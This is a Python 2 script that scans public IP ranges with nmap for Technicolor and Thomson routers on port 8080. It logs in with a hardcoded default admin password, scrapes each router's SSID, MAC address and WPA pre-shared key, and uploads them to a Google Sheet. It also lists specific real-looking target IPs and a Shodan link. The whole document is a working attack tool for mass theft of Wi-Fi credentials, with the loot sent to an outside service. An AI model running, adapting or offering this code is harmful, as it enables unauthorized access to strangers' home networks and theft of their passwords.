# -*- coding: utf-8 -*-
#segmento de 186 https://www.shodan.io/host/190.85.168.84
import requests as rq
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as BS
import gspread
from oauth2client.service_account import ServiceAccountCredentials
global user, password,header
import subprocess


device_thompson = 0
device_technicolor = 0
thom = 'Basic realm="Thomson"'
tech = 'Basic realm="Technicolor"'
header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
#181.52.82.215 181.54.153.14 http://186.87.3.237:8080/wlanRadio.asp 180-50 http://181.50.1.32:8080/wlanPrimaryNetwork.asp<<<< escanear esto http://181.63.15.177:8080/wlanGuestNetwork.asp
scope = ['https://spreadsheets.google.com/feeds']
credentials = ServiceAccountCredentials.from_json_keyfile_name('redes.json', scope)
gc = gspread.authorize(credentials)
sht2 = gc.open_by_url('https://docs.google.com/spreadsheets/d/12oE67zlhrOYCH5iWkKIi5xjB5PdacI08rZSl_toWfSs/edit#gid=0')
worksheet = sht2.get_worksheet(0)
user = "admin"
password = "Uq-4GIt3M"
rq = rq.Session()
row = 11571

def technicolor(ip,row):
    
    
    r = rq.get('http://'+str(ip)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth(user, password), timeout=1.5, headers=header) #/wlanPrimaryNetwork.asp
    r = rq.get('http://'+str(ip)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth(user, password), timeout=1.5, headers=header)
    #guest = s.get('http://'+ip+':8080/wlanGuestNetwork.asp', timeout=None)
    
    html = BS(r.content , "html.parser")
    #print html
    for datos in html.findAll("td", {"align":"middle"}):
        
        t = datos.text[24:]
        ma = t[-19:]
        mac = ma[1:-1]
        ssid = t[0:-19].lstrip()
        
        for pwd in html.find_all("input", {'name':"WpaPreSharedKey"}):
            pwd = pwd["value"].lstrip()
            
            print "Ip: %s; Mac: %s; Ssid: %s; Pass: %s"%(ip,mac,ssid,pwd)
            worksheet.update_acell('A%s'%(row), str(ip))
            worksheet.update_acell('B%s'%(row), str(mac))
            worksheet.update_acell('C%s'%(row), str(ssid))
            worksheet.update_acell('D%s'%(row), str(pwd))
            worksheet.update_acell('E%s'%(row), "Technicolor")
            
    
           

def thompson(ip,row):
    
    ip = str(ip)
    
    r = rq.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth(user,password), timeout=1.5, headers=header)
    r = rq.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth(user,password), timeout=1.5, headers=header)
    
    html = BS(r.content , "html.parser")
    
    for datos in html.findAll("td", {"align":"middle"}):
        #print datos.text
        t = datos.text[24:]
        ma = t[-19:]
        mac = ma[1:-1]
        ssid = datos.text[16:-19]
        #print ssid
        #"186.118.134.19"
        
        for pwd in html.find_all("input", {'name':"WpaPreSharedKey"}):
            pwd = pwd["value"]
            
            print "Ip: %s; Mac: %s; Ssid: %s; Pass: %s"%(ip,mac,ssid,pwd)
            worksheet.update_acell('A%s'%(row), str(ip))
            worksheet.update_acell('B%s'%(row), str(mac))
            worksheet.update_acell('C%s'%(row), str(ssid))
            worksheet.update_acell('D%s'%(row), str(pwd))
            worksheet.update_acell('E%s'%(row), "Tompson")
for oc in range(88,89): #80-87
    
    for last in range(0,256):#http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page
        rang = "186.%s.%s.*"%(oc,last)
        print rang
        worksheet.update_acell('F1', rang)
        ips = subprocess.check_output("sudo nmap -Pn %s -p8080 --open | awk '/is up/ {print up}; {gsub (/\(|\)/,\"\"); up = $NF}'" %(rang),shell=True)
        for ip in ips.splitlines():
            ip = str(ip)
            url = "http://%s:8080"%(ip)
            
            try:
                #print "hi"
                r = rq.get(url,timeout=1)
                #print r.status_code
            except:
                pass
            
            code = str(r.status_code)
    
            if code=="401":
    
                try:
            
                    
                    r = rq.get(url, timeout=0.8, headers=header)
                    device_head = str(r.headers)
            
                    if tech in device_head:
                        row = row + 1
                        device_technicolor = device_technicolor + 1
                        technicolor(ip,row)
                    elif thom in device_head:
                        row = row + 1
                        print "Un tompson"
                        print ip
                        device_thompson = device_thompson + 1
                        thompson(ip,row)
                    else:
                        pass
           
                except:
                 pass
            
    if last == 255:
        break
        
print str(device_technicolor)+" technicolor"
print str(device_thompson)+" tomson"
print str(device_thompson+device_technicolor)+" En total"



        
        
       
            
